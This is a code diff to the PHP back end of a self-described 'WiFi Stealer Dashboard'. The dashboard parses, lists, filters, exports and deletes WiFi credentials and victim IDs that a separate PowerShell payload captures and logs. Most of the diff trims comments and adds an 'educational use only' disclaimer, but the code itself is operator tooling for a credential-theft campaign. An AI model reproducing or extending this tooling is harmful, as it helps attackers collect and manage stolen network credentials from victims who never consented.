@@ -1,4 +1,6 @@
 <?php
+// WiFi Stealer Dashboard (victim ID + filters + location)
+// DISCLAIMER: Educational use only. Use only on systems/networks you are authorized to test.
 
 date_default_timezone_set('Asia/Kolkata');
 
@@ -7,7 +9,7 @@ $logFile = __DIR__ . '/wifi_creds.log';
 /**
  * Parse a single CSV capture line into a normalized array.
  *
- * CSV order (your payload must match):
+ * CSV order (must match PowerShell payload):
  *  0: Timestamp
  *  1: Victim ID
  *  2: SSID
@@ -77,17 +79,13 @@ function parse_capture_line($line)
     ];
 }
 
-/**
- * Safe HTML escape.
- */
+/** Safe HTML escape. */
 function h($v)
 {
     return htmlspecialchars((string)$v, ENT_QUOTES, 'UTF-8');
 }
 
-/**
- * Simple OS detection from user agent (viewer info only).
- */
+/** Simple OS detection from user agent (viewer info only). */
 function detectOS($userAgent) {
     $ua = strtolower($userAgent);
 
@@ -102,7 +100,7 @@ function detectOS($userAgent) {
     return 'Unknown';
 }
 
-// --- 1. CSV EXPORT: download all captures as CSV (extended) ---
+// --- 1. CSV EXPORT ---
 if (isset($_GET['action']) && $_GET['action'] === 'export_csv') {
     if (!file_exists($logFile)) {
         die('No data to export.');
@@ -165,7 +163,7 @@ if (isset($_GET['action']) && $_GET['action'] === 'export_csv') {
     exit;
 }
 
-// --- 2. CSV IMPORT: via upload button (frontend) ---
+// --- 2. CSV IMPORT ---
 $importStatus = null;
 if (isset($_POST['action']) && $_POST['action'] === 'import_csv') {
     if (!isset($_FILES['csv_file']) || $_FILES['csv_file']['error'] !== UPLOAD_ERR_OK) {
@@ -206,7 +204,7 @@ if (isset($_POST['action']) && $_POST['action'] === 'clear_all') {
     exit;
 }
 
-// --- 4. Delete single entry (line index in log file) ---
+// --- 4. Delete single entry ---
 if (isset($_POST['action']) && $_POST['action'] === 'delete_one') {
     $index = isset($_POST['idx']) ? intval($_POST['idx']) : -1;
 
@@ -310,7 +308,6 @@ foreach ($filteredEntries as $entry) {
     ];
 }
 
-// viewMode kept for potential future use
 $viewMode = 'basic';
 ?>
 <!DOCTYPE html>
@@ -652,7 +649,6 @@ $viewMode = 'basic';
         </div>
     </div>
 
-    <!-- BASIC TABLE VIEW -->
     <div class="card">
         <table>
             <thead>
@@ -712,7 +708,6 @@ $viewMode = 'basic';
         </table>
     </div>
 
-    <!-- DETAILS PANEL -->
     <div id="details-box" class="card" style="margin-top:12px; display:none;">
         <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px;">
             <div id="details-title" style="font-weight:600; font-size:14px;">Details of capture</div>
@@ -722,7 +717,7 @@ $viewMode = 'basic';
     </div>
 
     <div class="footer">
-        © 2026 WiFi Stealer Dashboard – Made By Zypher17
+        © 2026 WiFi Stealer Dashboard – Made By Zypher17 • Educational use only
     </div>
 </div>
 </body>
